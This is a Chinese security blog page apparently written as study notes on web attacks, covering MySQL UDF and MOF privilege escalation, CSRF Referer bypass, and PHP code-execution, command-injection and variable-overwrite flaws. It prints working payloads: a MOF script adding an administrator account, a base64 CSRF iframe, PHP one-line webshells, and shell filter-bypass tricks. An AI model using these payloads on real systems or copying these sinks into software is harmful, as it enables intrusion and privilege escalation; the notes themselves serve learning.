@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="三人行必有我师。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全知识点">
+<meta property="og:url" content="http://yoursite.com/2018/03/11/Study_from_other/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="三人行必有我师。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-2/68235578.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-12/10386748.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-17/5929394.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-17/84182679.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-17/41816108.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-17/67315107.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-17/72963009.jpg">
+<meta property="og:updated_time" content="2018-04-18T02:42:46.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web安全知识点">
+<meta name="twitter:description" content="三人行必有我师。">
+<meta name="twitter:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-2/68235578.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/11/Study_from_other/"/>
+
+
+
+
+
+  <title>Web安全知识点 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/11/Study_from_other/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web安全知识点</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-11T18:13:23+08:00">
+                2018-03-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全资料汇集/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全资料汇集</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>三人行必有我师。</p>
+<a id="more"></a>
+<h4 id="UDF提权原理"><a href="#UDF提权原理" class="headerlink" title="UDF提权原理"></a>UDF提权原理</h4><p><a href="http://www.secist.com/archives/618.html" target="_blank" rel="noopener">MySQL之UDF提权原理及实现</a></p>
+<p>提权原理：利用了<code>root</code>高权限，创建带有调用cmd的函数的<code>udf.dll</code>动态链接库。这样一来就可以利用<code>system</code>权限进行提权操作了。</p>
+<p><strong>数据库版本 5.0以下的</strong></p>
+<p>win2000  将udf.dll 文件导出到 <font color="red">C:\Winnt\udf.dll</font>下</p>
+<p>win2003 将udf.dll 文件导出到 <font color="red">C:\Windows\udf.dll </font>下</p>
+<p><strong>数据库版本为 5.1 以上的</strong></p>
+<p>我们则需要将 dll 文件导出到 mysql 安装目录的 <code>lib\plugin\</code> 下，才能创建自定义函数。注：如果没有 plugin 目录，我们可以进行手动创建</p>
+<p>通过大马进行<code>MYSQL</code>提权，或者使用<code>uef.php</code>此类的提权工具进行提权。</p>
+<p><a href="https://www.404sec.com/7815.html" target="_blank" rel="noopener">UDF提权原理</a></p>
+<p><code>UDF</code> – <code>User Defined Function</code>用户自定义函数，支持用户自定义函数的功能。</p>
+<p>Mysql有很多的内置函数提供给开发者，包括字符串函数、数值函数、日期和时间函数等，给开发人员带来了很多方便。虽然<code>Mysql</code>的内置函数丰富，但是毕竟不能满足所有人的需要，有时候我们需要对表中的数据进行一些处理，而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展，这就是可以自行添加<code>MySQL</code>的<code>UDF</code>。</p>
+<p>需要对Mysql数据库有足够高的权限就能为其添加自定义的函数。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-4-2/68235578.jpg" alt=""></p>
+<p>这里的自定义函数要以dll形式写成mysql的插件，提供给mysql来使用。</p>
+<p><a href="https://www.404sec.com/7817.html" target="_blank" rel="noopener">手把手教你写mysql的udf</a></p>
+<p>学会编写Mysql的用户自定义函数，然后编写提权的函数，调用cmd命令的函数。</p>
+<p><a href="https://xz.aliyun.com/t/2199" target="_blank" rel="noopener">高版本MySQL之UDF提权</a></p>
+<p><a href="https://xz.aliyun.com/t/2167" target="_blank" rel="noopener">翻译 MySQL UDF Exploitation</a></p>
+<p><a href="http://www.91ri.org/16540.html" target="_blank" rel="noopener">Linux MySQL Udf 提权</a></p>
+<h4 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h4><p><a href="http://www.secist.com/archives/608.html" target="_blank" rel="noopener">Mof提权原理及实现</a></p>
+<p>利用<code>c:/windows/system32/wbem/mof/</code>目录下的<code>nullevt.mof</code>文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的<code>cmd</code>命令使其被执行。</p>
+<p>首先将我们的<code>mof</code>提取脚本上传到可读可写目录下。接着选择<code>MySQL</code>提权项，输入已经获取的<code>MySQL</code>账户信息，并执行命令。</p>
+<pre><code>select load_file(“C:/php/APMServ5.2.6/www/htdocs/1.mof”) into dumpfile “c:/windows/system32/wbem/mof/nullevt.mof”
+</code></pre><p>在<code>mof</code>文件中，写入恶意代码，一般是添加用户，添加进管理员组。</p>
+<pre><code>ScriptText = 
+    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add\&quot;)&quot;; 
+}; 
+</code></pre><p>首先把<code>mof</code>文件上传，然后进行替换原始的。</p>
+<p><strong>版本问题</strong></p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=30066&amp;highlight=mof" target="_blank" rel="noopener">windows 2008 如何来执行mof?</a></p>
+<p>mof文件，在2003中直接把mof文件拖到wbem下的mof文件中，系统就会自动加载。win2008以后系统就不支持这种方式了，那么2008中是如何来加载mof文件的呢？</p>
+<pre><code>03以上必须要手动编译mof，用api或mofcomp
+%windir%\system32\wbem\mofcomp -N:root\subscription mof.mof
+都需要管理员权限才能执行。
+想达到任意写转任意代码执行的效果的话，换个方式吧，08上还是有个两三种的。
+</code></pre><p><a href="https://www.t00ls.net/viewthread.php?tid=24989&amp;highlight=mof" target="_blank" rel="noopener">[【转载】] php写的mof提权带回显带清楚命令版本</a></p>
+<h4 id="CSRF绕过-Referer"><a href="#CSRF绕过-Referer" class="headerlink" title="CSRF绕过 Referer"></a>CSRF绕过 Referer</h4><p><a href="http://www.cnblogs.com/huangjacky/p/4109096.html" target="_blank" rel="noopener">CSRF - 空Referer绕过</a></p>
+<p><a href="https://www.ohlinge.cn/web/csrf_referer.html" target="_blank" rel="noopener">CSRF 花式绕过Referer技巧</a></p>
+<p><strong>Referer为空的情况下</strong></p>
+<p>常见的协议：<code>ftp://,http://,https://,file://,javascript:,data</code></p>
+<p>在本地打开一个HTML页面，这个时候浏览器地址栏是<code>file://</code>开头，如果这个HTML页面向任何http站点提交请求的话，这些Referer都是空的，接下来用data:协议来构造一个自动提交的CSRF攻击。</p>
+<p>假设 <code>http://a.b.com/d</code>这个接口存在空Referer绕过的CSRF。POC</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+   &lt;iframe src=&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;&gt;
+&lt;/doby&gt;
+&lt;/html&gt;
+</code></pre><p>iframe的src为</p>
+<pre><code>&lt;form method=post action=http://a.b.com/d&gt;&lt;input type=text name=&apos;id&apos; value=&apos;123&apos;/&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+</code></pre><p><strong>判断Referer是某域名下绕过</strong></p>
+<p>比如找到的<code>csrf</code>验证的<code>referer</code>是<code>xxx.com</code>。验证referer可以找个二级域名<code>*.xx.com</code>。</p>
+<p><a href="http://www.freebuf.com/vuls/83398.html" target="_blank" rel="noopener">利用Window.Opener绕过CSRF保护</a></p>
+<p><code>CSRF</code>防护方法</p>
+<pre><code>1：检查 Referer
+2：基于表单的随机 Token
+3：基于Cookie的随机Token
+4：验证码
+</code></pre><h4 id="XSS盲打到内网"><a href="#XSS盲打到内网" class="headerlink" title="XSS盲打到内网"></a>XSS盲打到内网</h4><p>好洞，学习。</p>
+<p><a href="https://wooyun.shuimugan.com/bug/view?bug_no=059105" target="_blank" rel="noopener">锐捷某系列网关产品从XSS盲打到完全控制网关并留下后门</a></p>
+<p><a href="http://www.freebuf.com/articles/web/103097.html" target="_blank" rel="noopener">如何XSS自动化入侵内网</a></p>
+<p><a href="https://wooyun.shuimugan.com/bug/view?bug_no=76685" target="_blank" rel="noopener">我是如何通过一个 XSS 探测搜狐内网扫描内网并且蠕动到前台的！(附带各种 POC)</a></p>
+<p><a href="https://phpinfo.me/2016/07/28/1285.html" target="_blank" rel="noopener">点我一个链接就自动化入侵你的内网</a></p>
+<p><a href="http://bobao.360.cn/learning/detail/300.html" target="_blank" rel="noopener">内网渗透一：利用Xss漏洞和IE漏洞进入内网</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1004753" target="_blank" rel="noopener">跨站的艺术：XSS Fuzzing 的技巧</a></p>
+<h4 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h4><p>参考下面的文章，动手练习一下。</p>
+<p><a href="http://www.freebuf.com/column/166385.html" target="_blank" rel="noopener">PHP代码命令注入小结</a></p>
+<p><a href="http://www.cnblogs.com/xiaozi/p/7834367.html" target="_blank" rel="noopener">PHP代码执行函数总结</a></p>
+<p><strong>assert</strong></p>
+<pre><code>// assert和eval 类似
+&lt;?php
+assert($_REQUEST[cmd]);
+?&gt;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-4-12/10386748.jpg" alt=""></p>
+<p><strong>preg_replace()</strong></p>
+<p><a href="https://www.cdxy.me/?p=756" target="_blank" rel="noopener">一个PHP正则相关的“经典漏洞”</a></p>
+<pre><code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )
+
+搜索subject中匹配pattern的部分， 以replacement进行替换。
+</code></pre><p><code>preg_replace</code>函数是一个正则表达式的搜索和替换，因为存在危险的<code>/e</code>修饰符，使得<code>preg_replace()</code>将<code>replacement</code>参数当作<code>php</code>代码。</p>
+<pre><code>&lt;?php
+// cmd=phpinfo()
+@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&apos;cmd&apos;],&quot;abcd&quot;);
+
+?&gt;
+</code></pre><p><strong>create_function</strong></p>
+<p><code>create_function</code>主要用来创建匿名函数，如果没有对参数进行过滤，攻击者可以构造特殊字符串给<code>create_function()</code>执行任意命令</p>
+<pre><code>string create_function ( string $args , string $code )
+</code></pre><p><a href="https://paper.seebug.org/94/" target="_blank" rel="noopener">解析create_function() &amp;&amp; 复现wp</a></p>
+<p><a href="https://www.t00ls.net/articles-20774.html" target="_blank" rel="noopener">PHP create_function()注入命令执行漏洞</a></p>
+<p><a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">PHP create_function()代码注入</a></p>
+<pre><code>&lt;?php
+// ?cmd=phpinfo();  //必须有分号
+$func = create_function(&apos;&apos;,$_REQUEST[&apos;cmd&apos;]);
+$func();
+?&gt;
+</code></pre><p><strong>array_map()</strong></p>
+<p><a href="https://secure.php.net/manual/zh/function.array-map.php" target="_blank" rel="noopener">array_map</a></p>
+<pre><code>array array_map ( callable $callback , array $array1 [, array $... ] )
+array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。
+</code></pre><p><code>array_map()</code>函数将用户自定义函数作用到数组的每个值上，并返回用户自定义函数作用后带有新值的数组。</p>
+<p>回调函数接受的参数数目应该和传递给<code>array_map()</code>函数的数组数目一致。</p>
+<pre><code>&lt;?php
+//?func=system&amp;cmd=whoami
+
+$func = $_GET[&apos;func&apos;]; // $func 定义为system函数
+$cmd = $_GET[&apos;cmd&apos;];
+$array[0] = $cmd;
+$new_array = array_map($func,$array);
+
+?&gt;
+</code></pre><p>应用</p>
+<pre><code>http://192.168.86.194:9000/code/array_map.php?func=system&amp;cmd=whoami
+administrator 
+</code></pre><p><strong>call_user_func()/call_func_array()</strong></p>
+<p><code>call_user_func</code> 把第一个参数作为回调函数调用，其余参数是回调函数的参数。</p>
+<pre><code>&lt;?php
+// ?cmd=phpinfo()
+@call_user_func(assert,$_GET[&apos;cmd&apos;]);
+?&gt;
+</code></pre><p><code>call_user_func_array</code> 调用回调函数，并把一个数组参数作为回调函数的参数。</p>
+<pre><code>&lt;?php
+// ?cmd=phpinfo()
+$cmd = $_GET[&apos;cmd&apos;];
+$array[0] = $cmd;
+call_user_func_array(&quot;assert&quot;,$array);
+?&gt;
+</code></pre><p><strong>array_filter()</strong></p>
+<pre><code>array_filter — 用回调函数过滤数组中的单元
+
+array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )
+</code></pre><p>依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
+<pre><code>&lt;?php
+// ?func=system&amp;cmd=whoami
+$cmd = $_GET[&apos;cmd&apos;];
+$array1 = array($cmd);
+$func = $_GET[&apos;func&apos;];
+array_filter($array1,$func);
+
+?&gt;
+</code></pre><p><strong>usort()、uasort()</strong></p>
+<p>usort — 使用用户自定义的比较函数对数组中的值进行排序</p>
+<pre><code>bool usort ( array &amp;$array , callable $value_compare_func )
+</code></pre><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p>
+<p><strong>文件操作函数</strong></p>
+<pre><code>file_put_contents — 将一个字符串写入文件
+　　fputs() 函数写入文件
+</code></pre><p>代码</p>
+<pre><code>&lt;?php
+$test = &apos;&lt;?php  eval($_POST[c]); ?&gt;&apos;;
+file_put_contents(&apos;shell.php&apos;,$test);
+?&gt;
+
+
+
+&lt;?php  fputs(fopen(&apos;shell1.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[c]);?&gt;&apos;) ?&gt;
+</code></pre><p><strong>动态函数</strong></p>
+<p>PHP函数直接由字符串拼接</p>
+<pre><code>&lt;?php
+//?a=assert&amp;b=phpinfo()
+$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);
+?&gt;
+</code></pre><h4 id="PHP-命令执行函数"><a href="#PHP-命令执行函数" class="headerlink" title="PHP 命令执行函数"></a>PHP 命令执行函数</h4><p>PHP代码执行和命令执行的区别。个人认为代码执行主要是执行<code>PHP</code>的代码，比如<code>phpinfo()</code>，而命令执行是调用了系统的<code>shell</code>，比如<code>whoami</code>之类的系统命令。</p>
+<p><a href="https://stackoverflow.com/questions/3115559/exploitable-php-functions?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa" target="_blank" rel="noopener">Exploitable PHP functions</a></p>
+<p><a href="https://www.exploit-db.com/docs/english/42593-command-injection---shell-injection.pdf" target="_blank" rel="noopener">Command Injection/Shell Injection</a></p>
+<p><a href="http://wyb0.com/posts/command-execution-vulnerabilities/" target="_blank" rel="noopener">命令执行漏洞</a></p>
+<p><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧 </a></p>
+<p><a href="https://www.anquanke.com/post/id/84920" target="_blank" rel="noopener">命令执行和绕过的一些小技巧</a></p>
+<p><a href="https://www.t00ls.net/thread-45328-1-1.html" target="_blank" rel="noopener">探究PHP命令执行函数原理</a></p>
+<p><strong>Command Execution</strong></p>
+<pre><code>exec           - Returns last line of commands output
+passthru       - Passes commands output directly to the browser
+system         - Passes commands output directly to the browser and returns last line
+shell_exec     - Returns commands output
+`` (backticks) - Same as shell_exec()
+popen          - Opens read or write pipe to process of a command
+proc_open      - Similar to popen() but greater degree of control
+pcntl_exec     - Executes a program
+</code></pre><blockquote>
+<p>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等。当用户能控制执行函数中的参数时，就可以将恶意命令拼接到参数中，造成命令执行攻击。</p>
+</blockquote>
+<p><strong>system</strong></p>
+<pre><code>&lt;?php
+// cmd=whoami
+$arg = $_GET[&apos;cmd&apos;];
+if($arg){
+    system(&quot;$arg&quot;);
+}
+?&gt;
+</code></pre><p><a href="https://www.anquanke.com/post/id/84920" target="_blank" rel="noopener">命令执行和绕过的一些小技巧</a></p>
+<p><strong>黑名单</strong></p>
+<p>使用<code>$参数</code>，进行拼接。<code>ls</code> ==</p>
+<pre><code>root@kali:/tmp/shell# echo sec_note &gt; test
+root@kali:/tmp/shell# ls
+test
+root@kali:/tmp/shell# a=l;b=s;$a$b
+test
+root@kali:/tmp/shell# a=c;b=at;c=te;d=st;$a$b ${c}${d}
+sec_note
+root@kali:/tmp/shell# 
+</code></pre><p><strong>绕过空格</strong></p>
+<pre><code>root@kali:/tmp/shell# cat&lt;&gt;test
+sec_note
+root@kali:/tmp/shell# cat${IFS}test
+sec_note
+root@kali:/tmp/shell# cat${IS}test
+bash: cattest: command not found
+</code></pre><h4 id="PHP-变量覆盖"><a href="#PHP-变量覆盖" class="headerlink" title="PHP 变量覆盖"></a>PHP 变量覆盖</h4><p><a href="http://www.cnblogs.com/xiaozi/p/7768580.html" target="_blank" rel="noopener">变量覆盖漏洞</a></p>
+<p><a href="http://www.freebuf.com/column/150731.html" target="_blank" rel="noopener">变量覆盖漏洞</a></p>
+<p><a href="https://blog.csdn.net/niexinming/article/details/52637773" target="_blank" rel="noopener">变量覆盖</a></p>
+<blockquote>
+<p>用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序其他功能来实现完整的攻击。</p>
+</blockquote>
+<p><a href="https://secure.php.net/manual/zh/security.globals.php" target="_blank" rel="noopener">使用 Register Globals</a></p>
+<pre><code>Warning
+本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。
+</code></pre><p>测试<code>PHP 5.2.17</code> <code>php.ini</code></p>
+<pre><code>register_globals = On
+</code></pre><p>测试</p>
+<p>register_globals = Off</p>
+<pre><code>&lt;?php
+// ?id=1
+echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;;
+echo &apos;$_GET[&quot;id&quot;] :&apos;.$_GET[&apos;id&apos;].&quot;&lt;br/&gt;&quot;;
+echo &apos;$id :&apos;.$id;
+
+?&gt;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-4-17/5929394.jpg" alt=""></p>
+<p>register_globals = On</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-4-17/84182679.jpg" alt=""></p>
+<p>当<code>register_globals = On</code>，下面的<code>$id</code>可以获取到值。</p>
+<p><strong>$$导致变量覆盖</strong></p>
+<p><code>PHP</code>的引用允许用两个变量来指向同一个内容。</p>
+<p><strong><a href="https://secure.php.net/manual/zh/function.extract.php" target="_blank" rel="noopener">extract</a></strong></p>
+<p>extract — 从数组中将变量导入到当前的符号表</p>
+<pre><code>int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )
+</code></pre><p>本函数用来将变量从数组中导入到当前的符号表中。</p>
+<p>检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</p>
+<pre><code>&lt;?php
+$size = &quot;large&quot;;
+$var_array = array(&quot;color&quot; =&gt; &quot;blue&quot;,
+                    &quot;size&quot; =&gt; &quot;medium&quot;,
+                    &quot;shape&quot; =&gt; &quot;sphere&quot;);
+
+extract($var_array,EXTR_SKIP,&quot;wddx&quot;);
+echo &quot;$color,$size,$shape,$wddx_size\n&quot;;                    
+
+
+?&gt;
+</code></pre><p>EXTR_SKIP<br>如果有冲突，不覆盖已有的变量。<code>size</code>还是原来的值。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-4-17/41816108.jpg" alt=""></p>
+<pre><code>&lt;?php
+$id=1;
+extract($_GET);
+echo $id;
+?&gt;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-4-17/67315107.jpg" alt=""></p>
+<p><a href="https://secure.php.net/manual/zh/function.parse-str.php" target="_blank" rel="noopener">parse_str</a></p>
+<p>parse_str — 将字符串解析成多个变量</p>
+<pre><code>&lt;?php
+$str = &quot;first=value&amp;arr[]=PHP+JAVA&amp;arr[]=python&quot;;
+parse_str($str,$output);
+echo $output[&apos;first&apos;] .&quot;&lt;br/&gt;&quot;;
+echo $output[&apos;arr&apos;][0] .&quot;&lt;br/&gt;&quot;;
+echo $output[&apos;arr&apos;][1];
+?&gt;
+</code></pre><p>结果</p>
+<pre><code>value
+PHP JAVA
+python
+</code></pre><p><strong><a href="https://secure.php.net/manual/zh/function.import-request-variables.php" target="_blank" rel="noopener">import_request_variables</a></strong></p>
+<p>import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中</p>
+<pre><code>bool import_request_variables ( string $types [, string $prefix ] )
+</code></pre><p>将 <code>GET／POST／Cookie</code> 变量导入到全局作用域中。如果你禁止了 <code>register_globals</code>，但又想用到一些全局变量，那么此函数就很有用。</p>
+<pre><code>&lt;?php
+$b = 1;
+import_request_variables(&apos;GP&apos;);
+print_r($b);
+?&gt;
+
+
+http://192.168.86.194:9000/0411/4.php?b=1233
+// 结果 1233
+</code></pre><p><a href="http://www.freebuf.com/column/150731.html" target="_blank" rel="noopener">变量覆盖漏洞</a></p>
+<blockquote>
+<p>用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞。<br>漏洞出现情况。 $$ 使用不当、extrace()函数使用不当、parse_str()函数使用不当、import_request_variables()使用不当、开启了全局变量注册等。</p>
+</blockquote>
+<p><a href="https://www.phptpoint.com/php-dolor-and-double-dolor-variables/" target="_blank" rel="noopener">Difference Between $var and $$var in PHP</a></p>
+<blockquote>
+<p>$$var 使用名称为 $var 的值的变量的值<br>这意味着 $$var 被称为引用变量，其中 $var 是普通变量<br>它允许你有一个变量的变量，程序可以创建变量的名称，就像创建其他字符串一样。</p>
+</blockquote>
+<p><strong>eg1</strong></p>
+<pre><code>&lt;?php
+$name = &quot;php&quot;;
+$$name = &quot;java&quot;;
+echo $name.&quot;&lt;br/&gt;&quot;;
+echo $$name.&quot;&lt;br/&gt;&quot;;
+echo $php;  // java  $$name=&gt; $($name)-&gt;$php = &quot;java&quot;
+?&gt;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-4-17/72963009.jpg" alt=""></p>
+<p>$$导致的变量覆盖和<code>foreach</code>结合。使用<code>foreach</code>来遍历数组的值，然后将获取的数组键作为变量，数组中的键值作为变量的值。出现了变量覆盖漏洞。</p>
+<pre><code>&lt;?php
+
+//?name=test
+$name = &apos; secnote&apos;;
+foreach($_GET as $key =&gt; $value)
+
+$$key = $value;
+var_dump($key)&quot;;   //string(4) &quot;name&quot; test
+var_dump($value)&quot;;   // string(4) &quot;test&quot; test
+var_dump($$key);   // string(4) &quot;test&quot; 
+echo $name;         // test
+
+
+?&gt;
+</code></pre><p><a href="https://mp.weixin.qq.com/s/I7tEDv12e65KI93TCXN8Ug" target="_blank" rel="noopener">由MetInfo 深入理解PHP变量覆盖漏洞</a> </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/09/冒泡排序/" rel="next" title="冒泡排序算法">
+                <i class="fa fa-chevron-left"></i> 冒泡排序算法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/14/php和WINDOWS文件通配符/" rel="prev" title="PHP和Windows文件通配符">
+                PHP和Windows文件通配符 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
